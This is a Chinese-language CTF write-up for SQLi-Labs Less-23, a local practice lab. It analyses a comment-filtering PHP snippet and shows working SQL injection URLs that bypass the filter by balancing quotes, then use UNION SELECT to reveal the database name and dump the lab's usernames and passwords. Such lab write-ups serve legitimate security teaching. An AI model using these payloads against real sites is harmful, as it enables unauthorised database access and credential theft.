【SQLi-Labs】Less-23 注释符过滤与对称闭合注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.25 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 联合查询, 绕过过滤

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-23 (GET - Error Based - no quotes)
  • 提示：GET请求，注释符被过滤，单引号闭合

2. 源码分析与前置原理

根据本地源码审计，Less-23 的代码对常见的注释符进行了替换：

$id = preg_replace("/#/",  "", $id);   // 过滤 #
$id = preg_replace("/--/", "", $id);   // 过滤 --
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

原理分析：

由于 # 和 -- 被删除，常规的注释截断法失效。若输入 ?id=1'，后台拼接后为 id='1'' LIMIT 0,1，多出的单引号会导致语法错误。

破局思路：对称闭合。 既然不能删除尾巴，那我们就主动补齐尾巴。使用 ?id=1' and '1'='1，拼接后变为 id='1' and '1'='1' LIMIT 0,1，语法完美闭环且逻辑为真。

3. 操作步骤与解析

第一步：验证闭合

输入 URL：http://localhost/sqli-labs-master/Less-23/?id=1' and '1'='1

回显现象：页面正常回显 Dumb / Dumb，证明对称闭合生效。

第二步：联合查询爆库名

输入 URL：?id=-1' union select 1,database(),3 from users where '1'='1

回显现象：页面的第 2 列回显 security。

第三步：脱库获取账号密码

输入 URL：?id=-1' union select 1,group_concat(username,0x3a,password),3 from users where '1'='1

回显现象：页面回显 Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword... 等数据。

4. 踩坑记录与复盘

  • 注释符的局限性：在 WAF 拦截或代码过滤的场景中，注释符往往最先被照顾。掌握对称闭合（and '1'='1 或 or 1=1）是绕过限制的高级技巧。
  • 闭合的优先级：在常规 GET 注入中，注释符最为便捷；但在 Header/Cookie 注入中，对称闭合更为稳定（因为空格和特殊字符不易被吞）。

5. 知识点总结

  • 对称闭合：不用注释符，通过逻辑判断（如 and '1'='1）强行补齐引号或括号，让 SQL 语法合法。
  • 代码过滤绕过：了解常见的 `preg_replace` 过滤机制，学会通过改变 Payload 结构来规避敏感词。
